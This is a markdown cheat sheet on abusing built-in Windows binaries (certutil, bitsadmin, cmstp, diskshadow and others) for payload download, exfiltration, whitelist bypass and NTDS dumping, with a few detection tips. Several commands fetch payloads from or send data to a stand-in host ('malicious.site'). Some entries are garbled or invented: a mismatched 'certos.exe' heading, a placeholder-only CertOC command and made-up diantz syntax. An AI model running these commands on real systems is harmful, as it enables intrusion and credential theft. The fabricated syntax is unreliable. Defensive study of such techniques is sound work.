# Data Transfer Techniques
## cmd.exe
One of the techniques employed by adversaries is leveraging Alternate Data Streams (ADS) to hide malicious payloads. Additionally, `cmd.exe` can be used to **download or upload files**, facilitating data ingress or egress.
```cmd
#Creating an Alternate Data Stream:
echo This is hidden data > legitfile.txt:hidden.txt

#Executing a PowerShell command using cmd.exe:
cmd.exe /c "powershell -Command "& {Write-Output 'Hello from PowerShell'}""
```
> **Tips and Tricks:** Always monitor `cmd.exe` for unusual or unexpected command-line arguments. Consider using Sysmon to log commandline executions.

## powershell.exe (Encoding & Execution)
Malicious actors often use **PowerShell's** `-EncodedCommand` parameter to execute Base64 encoded commands, making detection and analysis more challenging.
```powershell
#Executing an Encoded PowerShell Command:
$command = "Write-Output 'Malicious Activity'"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))

powershell.exe -EncodedCommand $encodedCommand
```
> **Tips and Tricks:** Enable PowerShell logging to capture and analyze all executed scripts. Consider using tools like Revoke-Obfuscation to detect obfuscated PowerShell scripts.

## certutil.exe (Data Transfer and Encoding)
Certutil.exe is a command-line program used to manage certificates in Windows. However, its ability to download files and encode/decode data has made it a popular tool for attackers. They can misuse certutil.exe to fetch malicious payloads from remote servers or to obfuscate data to evade detection.

```cmd
#Downloading a File with Certutil:
certutil.exe -urlcache -split -f "http://malicious.site/payload.exe" payload.exe

#Decoding a Base64 Encoded File:
certutil.exe -decode encodedfile.txt decodedfile.exe
```

> **Tips and Tricks:** Monitor `certutil.exe` for any network connections or unusual file operations. If there's no legitimate use for **certutil.exe** in your environment, consider blocking or restricting its execution.


## bash.exe (Indirect Command Execution)
By invoking Bash.exe with specific parameters or scripts, malicious actors can run commands that might otherwise be flagged or blocked if executed directly.

**CMD**
```bash
bash.exe -c "your_linux_command_here"
```
**Powershell**
```powershell
Start-Process -NoNewWindow "bash.exe" -ArgumentList "-c your_linux_command_here"
```

## bitsadmin (File Transfer)
Bitsadmin.exe is a command-line tool that provides the ability to create and monitor BITS (Background Intelligent Transfer Service) jobs. While its legitimate use is for transferring files between machines, attackers can misuse it to download, upload, or even execute malicious files. Its ability to perform these tasks in the background can make detection more challenging.

**CMD**
```cmd
bitsadmin.exe /transfer job_name /download /priority normal http://malicious_url/malicious_file C:\path\to\save\malicious_file
```

**Powershell**
```powershell
Start-Process -NoNewWindow "bitsadmin.exe" -ArgumentList "/transfer job_name /download /priority normal http://malicious_url/malicious_file C:\path\to\save\malicious_file"
```

## certos.exe (File Transfer)
CertOC.exe is a legitimate binary related to certificate operations in Windows. However, its functionalities can be misused by attackers to download or execute malicious files. By invoking CertOC.exe with specific arguments, an attacker can transfer files from a remote location to the local machine, potentially bypassing certain security controls.

**CMD**
```cmd
CertOC.exe -parameter:[specific_parameters_for_transfer]
```

**Powershell**
```powershell
Start-Process -NoNewWindow "CertOC.exe" -ArgumentList "-parameter:[specific_parameters_for_transfer]"
```


## diantz.exe (NTFS Attributes Manipulation and File Transfer)
Diantz.exe is a legitimate Windows binary associated with archive functionalities. Attackers can exploit it to manipulate NTFS file attributes, which can be used to hide malicious activities or files. Additionally, it can be used to download malicious payloads from remote servers.

**CMD**
```cmd
Diantz.exe /option:C:\path\to\input http://malicious.site/payload
```

**Powershell**
```powershell
Invoke-Expression "Diantz.exe /option:C:\path\to\input http://malicious.site/payload"
```

## cmstp.exe (Application Whitelist Bypass)
Cmstp.exe is a Microsoft binary used for the installation of Connection Manager service profiles. Attackers have discovered that it can be abused to execute malicious scripts and bypass application whitelisting solutions, such as AppLocker, by invoking the installation of a malicious .inf file.

**CMD**
```cmd
cmstp.exe /s /ns C:\path\to\malicious.inf
```

**Powershell**
```powershell
Invoke-Expression "cmstp.exe /s /ns C:\path\to\malicious.inf"
```

## control.exe (Malicious Activities)
Control.exe is the main executable for the Windows Control Panel. Attackers can misuse it by invoking specific Control Panel items (.cpl files) that have been tampered with or replaced by malicious versions. This can lead to a range of malicious activities, from information theft to system compromise.

**CMD**
```cmd
control.exe C:\path\to\malicious.cpl
```

**Powershell**
```powershell
Invoke-Expression "control.exe C:\path\to\malicious.cpl"
```

## cscript (Script Execution and Data Stream Manipulation)
Cscript.exe is a command-line version of the Windows Script Host that allows users to run scripts by typing the script file name at the command prompt. While it's designed for legitimate scripting tasks, it can be used by attackers to execute malicious scripts or manipulate alternate data streams.

**CMD**
```cmd
cscript.exe C:\path\to\script.vbs
```

**Powershell**
```powershell
Invoke-Expression "cscript.exe C:\path\to\script.vbs"
```

## DataSvcUtil.exe (Exfiltration Over Web Service)
DataSvcUtil.exe is a tool used for generating data service classes. Malicious actors can misuse this tool to exfiltrate data by sending it to a web service. Monitoring network traffic and the behavior of this binary can help in identifying suspicious activities.

**CMD**
```cmd
DataSvcUtil.exe /out:C:\path\to\output /uri:http://malicious.site
```

**Powershell**
```powershell
Invoke-Expression "DataSvcUtil.exe /out:C:\path\to\output /uri:http://malicious.site"
```

## Diskshadow.exe (NTDS Dumping and Indirect Command Execution)
`Diskshadow.exe` is a Windows utility for disk shadow copies. Malicious actors can misuse it to dump the NTDS.dit file, which contains Active Directory data, including user credentials. Additionally, it can be used for indirect command execution, allowing attackers to run commands under the context of another process.

**CMD**
```cmd
Diskshadow.exe -s C:\path\to\script.txt
```

**Powershell**
```powershell
Invoke-Expression "Diskshadow.exe -s C:\path\to\script.txt"
```

































